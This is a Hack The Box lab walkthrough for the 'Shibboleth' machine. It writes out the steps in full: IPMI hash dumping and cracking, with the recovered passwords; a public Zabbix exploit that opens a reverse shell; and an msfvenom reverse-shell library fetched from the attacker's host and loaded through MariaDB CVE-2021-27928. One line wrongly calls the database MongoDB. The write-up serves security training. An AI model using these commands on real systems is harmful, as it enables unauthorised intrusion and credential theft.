# [Shibboleth](https://app.hackthebox.com/machines/Shibboleth)

```bash
nmap -p- -min-rate 10000 10.10.11.124 -Pn 
```

![Alt text](img/image.png)

We just know that port (80) is only open, let's do greater nmap scan for this port.

```bash
nmap -A -sC -sV -p80 10.10.11.124 -Pn 
```

![Alt text](img/image-1.png)

There is resolving into 'shibboleth.htb', let's add into '/etc/hosts' file.


Let's do Subdomain Enumeration via `wfuzz` tool.

```bash
wfuzz -u http://shibboleth.htb -H "Host: FUZZ.shibboleth.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --sc 200
```

![Alt text](img/image-2.png)

Let's add these also into '/etc/hosts' file.

![Alt text](img/image-3.png)


I also do nmap scan for 'UDP' ports.

![Alt text](img/image-4.png)


Port (623) is open, let's enumerate this via `msfconsole`. For this, I will use such an exploit 'use auxiliary/scanner/ipmi/ipmi_dumphashes'

![Alt text](img/image-5.png)


I found hash of 'Administrator', let's crack this via `hashcat` tool.

```bash
hashcat -m 7300 hash.txt --wordlist /usr/share/wordlists/rockyou.txt
```

![Alt text](img/image-6.png)


I have below sensitive credentials.

Administrator: ilovepumkinpie1


For 'http://zabbix.shibboleth.htb/', I login via above credentials.

![Alt text](img/image-7.png)


I search publicly known exploit and find [this](https://www.exploit-db.com/exploits/50816)

```bash
python3 50816.py http://zabbix.shibboleth.htb Administrator ilovepumkinpie1 10.10.16.8 1337
```

![Alt text](img/image-8.png)


I got reverse shell from port (1337).

![Alt text](img/image-9.png)


Let's make interactive shell.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl+Z
stty raw -echo; fg
export TERM=xterm
export SHELL=bash
```

![Alt text](img/image-10.png)


I don't have permission to read 'user.txt' file.

![Alt text](img/image-11.png)

I just try to switch with same password as before for 'ipmi-svc' user.

ipmi-svc: ilovepumkinpie1

user.txt

![Alt text](img/image-12.png)


By running `netstat -ntpl`, I see that for port (3306) , mysql database is running.

![Alt text](img/image-13.png)


I found cleartext credentials from '/etc/zabbix/zabbix_server.conf' file.

![Alt text](img/image-14.png)



zabbix: bloooarskybluh


Let's login into our mysql shell via this credentials..
```bash
mysql -u zabbix -pbloooarskybluh
```


I see that version of MariaDB is '10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04'.

![Alt text](img/image-15.png)


I found CVE for this version of MongoDB, whose id is **'CVE-2021-27928'**.


First, let's generate malicious '.so' file.
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.16.8 LPORT=1338 -f elf-so -o dr4ks.so
```

Then, upload this file into target machine.

```bash
python3 -m http.server --bind 10.10.16.8 8080
```

![Alt text](img/image-17.png)

We download a file from http server.

```bash
wget http://10.10.16.8:8080/dr4ks.so
```

![Alt text](img/image-16.png)


Then, access to shell and type this.

```bash
SET GLOBAL wsrep_provider="/home/ipmi-svc/dr4ks.so";
```

![Alt text](img/image-18.png)


I got reverse shell from port (1338).

![Alt text](img/image-19.png)


root.txt

![Alt text](img/image-20.png)